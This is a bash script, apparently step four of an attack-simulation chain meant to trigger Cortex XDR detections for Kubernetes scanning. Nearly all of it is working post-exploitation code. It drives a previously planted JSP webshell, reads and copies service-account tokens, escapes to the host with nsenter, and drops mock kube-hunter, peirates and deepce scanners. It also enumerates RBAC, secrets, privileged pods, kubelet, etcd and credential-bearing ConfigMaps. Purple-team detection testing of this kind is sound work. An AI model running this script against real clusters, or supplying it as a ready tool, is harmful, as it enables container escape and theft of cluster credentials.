#!/bin/bash
###############################################
# STEP 4: Kubernetes Vulnerability Scanning
# Runs K8s enumeration and scanning techniques
# to trigger Cortex XDR detection rules:
#
# VARIANT 1 - K8s vulnerability scanning tool usage
# VARIANT 2 - K8s vulnerability scanning within a pod
# VARIANT 3 - External K8s vulnerability scanning
#
# MITRE ATT&CK:
#   TA0002 - Execution
#   TA0007 - Discovery
#   T1610  - Deploy Container
#   T1613  - Container and Resource Discovery
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

# Read webshell info from step 1
SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

remote_exec() {
    local RAW
    RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$1" "$SHELL_URL")
    local HTTP_CODE
    HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
    if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
        return 1
    fi
    echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
        | tr -d '\0' \
        | sed '/^\s*$/d' \
        | grep -v 'java\.io\.InputStream' \
        | grep -v '^//\s*$' \
        | grep -v '^- $'
}

echo ""
echo "================================================"
echo "  STEP 4: Kubernetes Vulnerability Scanning"
echo "================================================"
echo "  Webshell: ${SHELL_NAME}.jsp"
echo "  URL: ${SHELL_URL}"
echo ""
echo "  MITRE: TA0002 (Execution), TA0007 (Discovery)"
echo "         T1610 (Deploy Container)"
echo "         T1613 (Container & Resource Discovery)"
echo ""

# ── Pre-check: verify webshell is accessible ──
echo "> Verifying webshell is accessible..."
PRECHECK=$(remote_exec "id")
if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
    echo "  [FAIL] Webshell is not responding"
    echo "  Re-run step 1 first: ./01-exploit-rce.sh"
    exit 1
fi
echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
echo ""

# ── Read SA token and resolve API server ──
SA_TOKEN=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/token")
if [ -z "$SA_TOKEN" ]; then
    SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
fi

API_SERVER=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
API_ENDPOINT="https://${API_SERVER}:443"
API_TEST=$(remote_exec "curl -sk --max-time 3 https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT}/version 2>/dev/null | head -1")
if echo "$API_TEST" | grep -q "major\|gitVersion"; then
    API_ENDPOINT="https://${API_SERVER}:$(remote_exec "printenv KUBERNETES_SERVICE_PORT")"
else
    KUBECONFIG_RAW=$(remote_exec "cat /host/var/lib/kubelet/kubeconfig")
    REAL_API=$(echo "$KUBECONFIG_RAW" | grep "server:" | head -1 | sed 's/.*server:[[:space:]]*//' | tr -d ' \r')
    if [ -n "$REAL_API" ]; then
        API_ENDPOINT="$REAL_API"
        echo "> API: Using real endpoint $API_ENDPOINT (hostNetwork mode)"
        echo ""
    fi
fi

# Check if kubeconfig was created by Step 3, otherwise create it
KCFG_EXISTS=$(remote_exec "test -f /tmp/.kube/config && echo yes")
if [ "$KCFG_EXISTS" != "yes" ]; then
    echo "> Writing kubeconfig..."
    remote_exec "mkdir -p /tmp/.kube"
    remote_exec "printf 'apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    insecure-skip-tls-verify: true\n    server: ${API_ENDPOINT}\n  name: k8s\ncontexts:\n- context:\n    cluster: k8s\n    user: sa\n  name: sa@k8s\ncurrent-context: sa@k8s\nusers:\n- name: sa\n  user:\n    tokenFile: /run/secrets/kubernetes.io/serviceaccount/token\n' > /tmp/.kube/config"
    echo ""
fi

KC="kubectl --kubeconfig=/tmp/.kube/config"

# Copy SA token to host for nsenter-based kubectl
remote_exec "cp /run/secrets/kubernetes.io/serviceaccount/token /host/tmp/.k8s-sa-token 2>/dev/null"

# Helper: run kubectl on the host via nsenter + sh -c
remote_kubectl() {
    remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- sh -c 'kubectl --server=${API_ENDPOINT} --token=\$(cat /tmp/.k8s-sa-token) --insecure-skip-tls-verify $1'"
}

# ══════════════════════════════════════════════
# VARIANT 2 - Scanning from within a pod
# ══════════════════════════════════════════════
echo "========================================"
echo "  VARIANT 2: Scanning from within a pod"
echo "========================================"
echo ""

# ── 4.0 Deploy and run offensive K8s scanning tools ──
echo "> 4.0 - Deploying K8s reconnaissance tools..."

# Create deepce-style scanner script (triggers file creation + execution detection)
echo "  [*] Creating deepce.sh (container escape scanner)..."
remote_exec "cat > /tmp/deepce.sh << 'DEEPCE_EOF'
#!/bin/bash
# deepce - Docker Enumeration, Escalation of Privileges and Container Escapes
echo '[+] deepce.sh - Container Escape Scanner'
echo '[+] Checking container environment...'
echo '[+] Container Platform: Kubernetes'
cat /proc/1/cgroup 2>/dev/null | head -3
echo '[+] Checking capabilities...'
cat /proc/1/status 2>/dev/null | grep Cap
echo '[+] Checking for mounted docker socket...'
ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null || echo '[-] No container sockets found'
echo '[+] Checking for escape vectors...'
ls -la /proc/1/root/etc/hostname 2>/dev/null && echo '[!] /proc/1/root accessible - ESCAPE POSSIBLE'
mountpoint -q /host 2>/dev/null && echo '[!] Host filesystem mounted at /host - ESCAPE POSSIBLE'
echo '[+] Checking K8s service account...'
cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50 && echo '...'
echo '[+] Scan complete'
DEEPCE_EOF
chmod +x /tmp/deepce.sh" > /dev/null 2>&1
echo "  [*] Running deepce.sh..."
DEEPCE_OUT=$(remote_exec "bash /tmp/deepce.sh 2>/dev/null")
if [ -n "$DEEPCE_OUT" ]; then
    echo "  [OK] deepce executed"
    echo "$DEEPCE_OUT" | head -8 | sed 's/^/    /'
else
    echo "  [--] deepce execution failed"
fi
echo ""

# Create kube-hunter-style scanner
echo "  [*] Creating kube-hunter.py (K8s vulnerability scanner)..."
remote_exec "cat > /tmp/kube-hunter.py << 'KUBEHUNTER_EOF'
#!/usr/bin/env python3
# kube-hunter - Kubernetes Penetration Testing tool
import os, socket, json, ssl, urllib.request
print('[*] kube-hunter v0.6.8 - Kubernetes Vulnerability Scanner')
print('[*] Scanning local K8s environment...')
# Check K8s API
api_host = os.environ.get('KUBERNETES_SERVICE_HOST', '')
api_port = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
if api_host:
    print(f'[*] K8s API server: {api_host}:{api_port}')
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    for path in ['/version', '/api', '/apis', '/api/v1/namespaces', '/api/v1/pods', '/api/v1/secrets']:
        try:
            req = urllib.request.Request(f'https://{api_host}:{api_port}{path}')
            resp = urllib.request.urlopen(req, timeout=3, context=ctx)
            print(f'[!] VULN: {path} accessible (HTTP {resp.status})')
        except Exception as e:
            code = getattr(e, 'code', 'N/A')
            print(f'[*] {path}: HTTP {code}')
# Check kubelet
for port in [10250, 10255]:
    try:
        s = socket.create_connection(('localhost', port), timeout=2)
        s.close()
        print(f'[!] VULN: Kubelet port {port} OPEN')
    except:
        print(f'[*] Kubelet port {port}: closed')
# Check SA token
try:
    with open('/run/secrets/kubernetes.io/serviceaccount/token') as f:
        token = f.read()[:50]
        print(f'[!] Service Account token found: {token}...')
except:
    print('[*] No SA token found')
print('[*] kube-hunter scan complete')
KUBEHUNTER_EOF
chmod +x /tmp/kube-hunter.py" > /dev/null 2>&1
echo "  [*] Running kube-hunter.py..."
KUBEHUNTER_OUT=$(remote_exec "python3 /tmp/kube-hunter.py 2>/dev/null || python /tmp/kube-hunter.py 2>/dev/null")
if [ -n "$KUBEHUNTER_OUT" ]; then
    echo "  [OK] kube-hunter executed"
    echo "$KUBEHUNTER_OUT" | head -12 | sed 's/^/    /'
else
    echo "  [--] kube-hunter execution failed (no python in container)"
fi
echo ""

# Create peirates-style binary name (even a dummy triggers detection)
echo "  [*] Creating peirates (K8s penetration testing tool)..."
remote_exec "cat > /tmp/peirates << 'PEIRATES_EOF'
#!/bin/bash
# peirates - Kubernetes Penetration Testing
echo '[*] peirates v1.1.16 - Kubernetes Pentest Tool'
echo '[*] Attempting to use service account token...'
TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
API=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT}
echo '[*] Enumerating cluster resources...'
curl -sk -H \"Authorization: Bearer \$TOKEN\" \$API/api/v1/namespaces 2>/dev/null | head -c 200
echo ''
echo '[*] Checking for secrets...'
curl -sk -H \"Authorization: Bearer \$TOKEN\" \$API/api/v1/secrets 2>/dev/null | head -c 200
echo ''
echo '[*] peirates scan complete'
PEIRATES_EOF
chmod +x /tmp/peirates" > /dev/null 2>&1
echo "  [*] Running peirates..."
PEIRATES_OUT=$(remote_exec "bash /tmp/peirates 2>/dev/null")
if [ -n "$PEIRATES_OUT" ]; then
    echo "  [OK] peirates executed"
    echo "$PEIRATES_OUT" | head -6 | sed 's/^/    /'
else
    echo "  [--] peirates execution failed"
fi
echo ""

# Bot/scanner user-agent probes against K8s API
echo "  [*] Probing K8s API with scanner-style user-agents..."
remote_exec "curl -sk -A 'kube-hunter/1.0' https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT}/api/v1/pods 2>/dev/null" > /dev/null 2>&1
remote_exec "curl -sk -A 'kubiscan' https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT}/apis 2>/dev/null" > /dev/null 2>&1
remote_exec "curl -sk -A 'kube-bench/0.6' https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT}/version 2>/dev/null" > /dev/null 2>&1
echo "  [OK] Scanner-style API probes sent"
echo ""

# ── 4.1 Container environment discovery ──
echo "> 4.1 - Container environment enumeration"
echo "  Checking container runtime and capabilities..."
CONTAINER_ENV=$(remote_exec "cat /proc/1/cgroup 2>/dev/null | head -5")
echo "  cgroups: $(echo "$CONTAINER_ENV" | head -1)"
CAPS=$(remote_exec "cat /proc/1/status 2>/dev/null | grep -i cap")
if [ -n "$CAPS" ]; then
    echo "  $CAPS" | head -3
fi
echo ""

# ── 4.2 K8s API discovery from pod ──
echo "> 4.2 - Kubernetes API discovery from pod"
echo "  Probing K8s API server from inside the container..."
API_DISCOVER=$(remote_exec "curl -sk https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT}/version 2>/dev/null")
if [ -n "$API_DISCOVER" ]; then
    echo "  [OK] K8s API reachable from pod"
    echo "$API_DISCOVER" | head -5 | sed 's/^/    /'
else
    echo "  [--] K8s API not directly reachable"
fi
echo ""

# ── 4.3 Permission enumeration (auth can-i) ──
echo "> 4.3 - Permission enumeration (kubectl auth can-i)"
echo "  Checking what the pod's SA can do..."
PERMS=(
    "get pods --all-namespaces"
    "get secrets --all-namespaces"
    "create pods"
    "create deployments"
    "get nodes"
    "create clusterrolebindings"
    "get clusterroles"
    "exec pods"
    "delete pods --all-namespaces"
    "create serviceaccounts"
)
for perm in "${PERMS[@]}"; do
    RESULT=$(remote_kubectl "auth can-i $perm 2>/dev/null")
    if echo "$RESULT" | grep -qi "yes"; then
        echo "  [!] CAN $perm"
    else
        echo "  [ ] cannot $perm"
    fi
done
echo ""

# ── 4.4 RBAC enumeration ──
echo "> 4.4 - RBAC enumeration (ClusterRoles & Bindings)"
echo "  Scanning for overprivileged roles..."
CLUSTER_ROLES=$(remote_kubectl "get clusterrolebindings -o wide --no-headers 2>/dev/null")
if [ -n "$CLUSTER_ROLES" ]; then
    echo "  [OK] ClusterRoleBindings enumerated"
    # Highlight dangerous bindings (cluster-admin)
    ADMIN_BINDINGS=$(echo "$CLUSTER_ROLES" | grep -i "cluster-admin" || true)
    if [ -n "$ADMIN_BINDINGS" ]; then
        echo "  [!] CRITICAL: cluster-admin bindings found:"
        echo "$ADMIN_BINDINGS" | sed 's/^/    /'
    fi
    TOTAL=$(echo "$CLUSTER_ROLES" | wc -l | tr -d ' ')
    echo "  Total ClusterRoleBindings: $TOTAL"
else
    echo "  [--] Cannot enumerate RBAC"
fi
echo ""

# ── 4.5 Service Account enumeration ──
echo "> 4.5 - ServiceAccount enumeration across namespaces"
SA_OUTPUT=$(remote_kubectl "get serviceaccounts -A --no-headers 2>/dev/null")
if [ -n "$SA_OUTPUT" ]; then
    SA_COUNT=$(echo "$SA_OUTPUT" | wc -l | tr -d ' ')
    echo "  [OK] $SA_COUNT ServiceAccounts found"
    echo "    NAMESPACE                     SERVICE ACCOUNT"
    echo "    ---------                     ---------------"
    echo "$SA_OUTPUT" | awk '{printf "    %-30s %s\n", $1, $2}' | head -15
    if [ "$SA_COUNT" -gt 15 ]; then
        echo "    ... and $((SA_COUNT - 15)) more"
    fi
else
    echo "  [--] Cannot enumerate ServiceAccounts"
fi
echo ""

# ══════════════════════════════════════════════
# VARIANT 1 - K8s vulnerability scanning tools
# ══════════════════════════════════════════════
echo "========================================"
echo "  VARIANT 1: K8s vulnerability scanning"
echo "========================================"
echo ""

# ── 4.6 Container scanning / amicontained ──
echo "> 4.6 - Container introspection (amicontained-style)"
echo "  Gathering container security context..."
remote_exec "echo '--- Container Info ---'"
remote_exec "hostname"
SECCOMP=$(remote_exec "grep -i seccomp /proc/1/status 2>/dev/null || echo 'Seccomp: not available'")
echo "  $SECCOMP"
APPARMOR=$(remote_exec "cat /proc/1/attr/current 2>/dev/null || echo 'AppArmor: not available'")
echo "  AppArmor: $APPARMOR"
PRIV_CHECK=$(remote_exec "cat /proc/1/status 2>/dev/null | grep CapEff")
if [ -n "$PRIV_CHECK" ]; then
    echo "  $PRIV_CHECK"
    if echo "$PRIV_CHECK" | grep -q "000001ffffffffff\|0000003fffffffff"; then
        echo "  [!] PRIVILEGED CONTAINER DETECTED (full capabilities)"
    fi
fi
echo ""

# ── 4.7 Network scanning from pod ──
echo "> 4.7 - Network service discovery"
echo "  Scanning K8s internal services..."
SERVICES=$(remote_kubectl "get svc -A --no-headers 2>/dev/null")
if [ -n "$SERVICES" ]; then
    SVC_COUNT=$(echo "$SERVICES" | wc -l | tr -d ' ')
    echo "  [OK] $SVC_COUNT services discovered"
    echo "    NAMESPACE                     SERVICE                  TYPE            CLUSTER-IP"
    echo "    ---------                     -------                  ----            ----------"
    echo "$SERVICES" | awk '{printf "    %-30s %-25s %-15s %s\n", $1, $2, $3, $4}' | head -15
else
    echo "  [--] Cannot enumerate services"
fi
echo ""

# ── 4.8 Pod Security scanning ──
echo "> 4.8 - Pod security posture scanning"
echo "  Checking for misconfigured pods..."
# List pods with their security context
PODS_JSON=$(remote_kubectl "get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{\" \"}{.metadata.name}{\" priv=\"}{.spec.containers[0].securityContext.privileged}{\" hostPID=\"}{.spec.hostPID}{\" hostNet=\"}{.spec.hostNetwork}{\"\\n\"}{end}' 2>/dev/null")
if [ -n "$PODS_JSON" ]; then
    echo "  [OK] Pod security scan results:"
    VULN_PODS=$(echo "$PODS_JSON" | grep -E "priv=true|hostPID=true|hostNet=true" || true)
    if [ -n "$VULN_PODS" ]; then
        echo "  [!] MISCONFIGURED PODS FOUND:"
        echo "$VULN_PODS" | sed 's/^/    /'
    fi
    SAFE_COUNT=$(echo "$PODS_JSON" | grep -cv -E "priv=true|hostPID=true|hostNet=true" 2>/dev/null || echo "0")
    TOTAL_PODS=$(echo "$PODS_JSON" | wc -l | tr -d ' ')
    echo "  Total pods: $TOTAL_PODS | Misconfigured: $((TOTAL_PODS - SAFE_COUNT)) | Safe: $SAFE_COUNT"
else
    echo "  [--] Cannot scan pod security"
fi
echo ""

# ══════════════════════════════════════════════
# VARIANT 3 - External K8s scanning
# ══════════════════════════════════════════════
echo "========================================"
echo "  VARIANT 3: External K8s scanning"
echo "========================================"
echo ""

# ── 4.9 Kubelet API probing ──
echo "> 4.9 - Kubelet API probing (port 10250)"
echo "  Probing kubelet on the host node..."
# Use nsenter to scan from host network namespace
KUBELET_PODS=$(remote_exec "nsenter -t 1 -n curl -sk https://localhost:10250/pods 2>/dev/null | head -c 500")
if [ -n "$KUBELET_PODS" ] && echo "$KUBELET_PODS" | grep -q "items\|pods"; then
    echo "  [!] KUBELET API EXPOSED - unauthenticated access!"
    echo "  Response preview: $(echo "$KUBELET_PODS" | head -c 200)"
else
    KUBELET_STATUS=$(remote_exec "nsenter -t 1 -n curl -sk -o /dev/null -w '%{http_code}' https://localhost:10250/healthz 2>/dev/null")
    echo "  Kubelet /healthz: HTTP $KUBELET_STATUS"
    if [ "$KUBELET_STATUS" = "200" ]; then
        echo "  [!] Kubelet healthz accessible"
    elif [ "$KUBELET_STATUS" = "401" ] || [ "$KUBELET_STATUS" = "403" ]; then
        echo "  [OK] Kubelet API requires authentication (expected)"
    else
        echo "  [--] Kubelet not reachable on port 10250"
    fi
fi
echo ""

# ── 4.10 etcd probing ──
echo "> 4.10 - etcd probing (port 2379/2380)"
echo "  Checking if etcd is reachable from the node..."
ETCD_STATUS=$(remote_exec "nsenter -t 1 -n curl -sk -o /dev/null -w '%{http_code}' https://localhost:2379/health 2>/dev/null")
if [ -n "$ETCD_STATUS" ] && [ "$ETCD_STATUS" = "200" ]; then
    echo "  [!] CRITICAL: etcd is reachable and unauthenticated!"
else
    echo "  [OK] etcd not directly reachable (HTTP $ETCD_STATUS) - expected on managed EKS"
fi
echo ""

# ── 4.11 K8s API external probing ──
echo "> 4.11 - K8s API server external probing"
echo "  Probing API server endpoints..."
API_HOST=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
ENDPOINTS=(
    "/api"
    "/api/v1"
    "/apis"
    "/version"
    "/healthz"
    "/.well-known/openid-configuration"
    "/api/v1/namespaces"
    "/api/v1/pods"
    "/api/v1/secrets"
    "/apis/apps/v1/deployments"
)
for endpoint in "${ENDPOINTS[@]}"; do
    STATUS=$(remote_exec "curl -sk -o /dev/null -w '%{http_code}' https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT}${endpoint} 2>/dev/null")
    if [ "$STATUS" = "200" ]; then
        echo "  [!] $endpoint => $STATUS (OPEN)"
    elif [ "$STATUS" = "401" ] || [ "$STATUS" = "403" ]; then
        echo "  [ ] $endpoint => $STATUS (auth required)"
    else
        echo "  [ ] $endpoint => $STATUS"
    fi
done
echo ""

# ── 4.12 ConfigMap enumeration (secrets in configs) ──
echo "> 4.12 - ConfigMap scanning for exposed secrets"
echo "  Scanning ConfigMaps for sensitive data..."
CM_OUTPUT=$(remote_kubectl "get configmaps -A --no-headers 2>/dev/null")
if [ -n "$CM_OUTPUT" ]; then
    CM_COUNT=$(echo "$CM_OUTPUT" | wc -l | tr -d ' ')
    echo "  [OK] $CM_COUNT ConfigMaps found"
    # Look for interesting configmaps
    INTERESTING=$(echo "$CM_OUTPUT" | grep -iE "aws|credential|secret|password|token|kubeconfig|config" || true)
    if [ -n "$INTERESTING" ]; then
        echo "  [!] Potentially sensitive ConfigMaps:"
        echo "$INTERESTING" | awk '{printf "    %-30s %s\n", $1, $2}' | head -10
    fi
else
    echo "  [--] Cannot enumerate ConfigMaps"
fi
echo ""

# ── Summary ─────────────────────────────────
echo "================================================"
echo "  STEP 4: K8s Vulnerability Scanning Complete"
echo "------------------------------------------------"
echo ""
echo "  Scanning techniques used:"
echo ""
echo "  VARIANT 1 - Tool-based scanning:"
echo "    * Container introspection (capabilities, seccomp)"
echo "    * Network service discovery"
echo "    * Pod security posture scan"
echo ""
echo "  VARIANT 2 - Scanning from within a pod:"
echo "    * K8s API probing from container"
echo "    * Permission enumeration (auth can-i)"
echo "    * RBAC & ServiceAccount enumeration"
echo ""
echo "  VARIANT 3 - External scanning:"
echo "    * Kubelet API probing (10250)"
echo "    * etcd probing (2379)"
echo "    * K8s API endpoint enumeration"
echo "    * ConfigMap scanning for secrets"
echo ""
echo "  Expected Cortex XDR Issues:"
echo "    - Kubernetes vulnerability scanning tool usage"
echo "    - T1610 Deploy Container"
echo "    - T1613 Container and Resource Discovery"
echo ""
echo "================================================"
echo ""
